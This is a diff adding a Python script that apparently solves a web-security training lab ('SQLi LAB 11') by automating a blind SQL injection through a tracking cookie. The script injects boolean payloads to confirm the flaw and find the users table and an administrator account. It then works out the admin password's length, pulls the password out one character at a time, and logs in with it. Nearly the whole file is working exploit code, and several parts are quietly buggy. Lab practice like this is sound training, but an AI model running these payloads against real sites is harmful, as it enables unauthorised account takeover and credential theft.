@@ -1,0 +1,162 @@
+import requests
+import sys
+from bs4 import BeautifulSoup
+import re
+import urllib3
+from requests.adapters import HTTPAdapter, Retry
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+
+def get_tracking_cookie(url):
+
+    x = requests.get(url[0], verify=False)
+    cookie = x.cookies.get_dict()  # will get cookie as a dictionary
+    # will get the tracking cookie value by dictionary key = 'TrackingId'
+    tracking_cookie = cookie['TrackingId']
+    return cookie
+
+
+def r2(url, cookie):
+
+    s = requests.Session()
+    retries = Retry(
+        total=5,
+        backoff_factor=0.1,
+        status_forcelist=[504, 522, 525]
+    )
+    s.mount('https://', HTTPAdapter(max_retries=retries))
+    r2 = s.get(url[0], cookies=cookie, verify=False)
+    r2 = BeautifulSoup(r2.text, 'html.parser')
+    return r2
+
+
+def confirm_blind_sqli(url, cookie):
+
+    for i in range(2):
+        cookie = cookie
+        sqli_payload = "' AND '1'='%s" % i
+        # will add the sqli payload to the 'TrackingId'
+        cookie['TrackingId'] = cookie['TrackingId'] + sqli_payload
+        print(cookie)
+        r1 = r2(url, cookie)
+        # will keep 16 chars cookie original value
+        cookie['TrackingId'] = cookie['TrackingId'][:16]
+        print(cookie['TrackingId'])
+        welcome = re.search(r'Welcome', r1.text)
+        if welcome:
+            print('>>> abbss\n')  # if response contains Welcome, print abbass
+        else:
+            print('>>> Mohsen\n')
+
+
+def confirm_users_table(url, cookie):
+    sqli_payload = "' AND (SELECT 'a' FROM users LIMIT 1)='a"
+    cookie['TrackingId'] = cookie['TrackingId'] + sqli_payload
+    print(cookie)
+    r1 = r2(url, cookie)
+    # print(r1)
+
+    welcome = re.search(r'Welcome', r1.text)
+    if welcome:
+        print('>>> abbss table\n')  # if true, print abbass table
+    else:
+        print('>>> Mohsen no table\n')
+
+
+def confirm_admin_account(url, cookie):
+    sqli_payload = "' AND (SELECT 'a' FROM users WHERE username='administrator')='a"
+    cookie['TrackingId'] = cookie['TrackingId'] + sqli_payload
+    r1 = r2(url, cookie)
+
+    welcome = re.search(r'Welcome', r1.text)
+    if welcome:
+        print('>>> abbss admin account found\n')  # if true, print abbass table
+    else:
+        print('>>> Mohsen no admin\n')
+
+
+def find_admin_len(url, cookie):
+    for i in range(31):
+        sqli_payload = "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>%s)='a" % i
+        cookie['TrackingId'] = cookie['TrackingId'] + sqli_payload
+        r1 = r2(url, cookie)
+
+        welcome = re.search(r'Welcome', r1.text)
+        if welcome:
+            i += 1
+        else:
+            print('>>> Admin password length= %s\n' % i)
+            break
+
+
+def find_admin_pass(url, cookie):
+    array = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r",
+             "v", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
+    admin_passwd = []
+    cookie['TrackingId'] = cookie['TrackingId'][:16]
+    for i in range(1, 21):
+        for j in array:
+            sqli_payload = "' AND (SELECT SUBSTRING(password,%s,1) FROM users WHERE username='administrator')='%s" % (
+                i, j)
+            cookie['TrackingId'] = cookie['TrackingId'] + sqli_payload
+            r1 = r2(url, cookie)
+            cookie['TrackingId'] = cookie['TrackingId'][:16]
+            welcome = re.search(r'Welcome', r1.text)
+
+            if welcome:
+                admin_passwd == admin_passwd.append(j)
+                break
+            
+        
+        i += 1
+    pass1 = "".join(admin_passwd)
+    return pass1
+
+
+def login_with_pass(url, cookie, pass1):
+    cookie['TrackingId'] = cookie['TrackingId'][:16]
+    print(pass1)
+    path = "login"
+    url1 = url[0] + path
+    r = requests.get(url1, cookies=cookie, verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf_token = soup.find('input', attrs={'name': 'csrf'})[
+        'value']  # exclude crsf token value
+    values = {'csrf': csrf_token,
+              'username': 'administrator', 'password': pass1}
+    r = requests.post(url1, data=values, cookies=cookie,
+                      verify=False, proxies=proxies)
+    if r.status_code == 200:
+        print("SQLi LAB 11 has been solved")
+
+
+if __name__ == '__main__':
+
+    try:
+        url = sys.argv[1].split()
+    except IndexError:
+        print('[-] usage of <url> %s' % sys.argv[0])
+        print('[-] Example: www.abbass.com %s' % sys.argv[0])
+        sys.exit(-1)
+
+    cookie = get_tracking_cookie(url)
+    print('#Confirming blind SQLi')
+    confirm_blind_sqli(url, cookie)
+
+    print('#Confirming Users table existance')
+    confirm_users_table(url, cookie)
+
+    print('#Confirming administrator account')
+    confirm_admin_account(url, cookie)
+
+    print('#Findind admin password length')
+    find_admin_len(url, cookie)
+
+    print('#Finding admin password value')
+    pass1 = find_admin_pass(url, cookie)
+
+    print('#testing admin password')
+    login_with_pass(url, cookie, pass1)
